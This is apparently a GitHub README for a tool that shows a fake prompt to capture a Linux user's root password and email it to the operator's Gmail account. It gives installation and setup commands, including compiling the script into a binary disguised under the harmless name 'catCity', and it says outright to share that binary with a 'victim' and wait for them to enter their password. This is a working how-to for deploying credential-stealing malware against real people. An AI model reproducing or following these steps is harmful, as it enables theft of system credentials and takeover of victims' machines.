# Get Linux Root Password 
 
This tool display fake prompt to get root password and send password to your mail address!

# Install

```
sudo pip3 install pyinstaller
```
```
git clone https://github.com/DJDarkCyber/getLinuxRootPassword.git
```

# Setting Up..

Create an new Gmail Account

Visit https://myaccount.google.com/lesssecureapps

Change to your new gmail account and make sure "allow less secure apps" is turned on

![image](https://user-images.githubusercontent.com/86729101/155201000-c193aa9a-d431-4bb0-8d16-ec007bd23272.png)



`cd getLinuxRootPassword`

`nano getRootPassword.py`

![image](https://user-images.githubusercontent.com/86729101/155199426-ab14468e-1772-4f66-bba7-1239ecf39cf4.png)

*Change the myMail and myPass. Only Gmail can be used* 

Example : 

myMail = "somestuff@gmail.com"

myPass = "Password123"

# Converting into binary 

Run : 

```
pyinstaller --onefile getRootPassword.py
```
```
cp dist/getRootPassword catCity
```

Share the *catCity* binary file with victim and wait until he/she enters password 
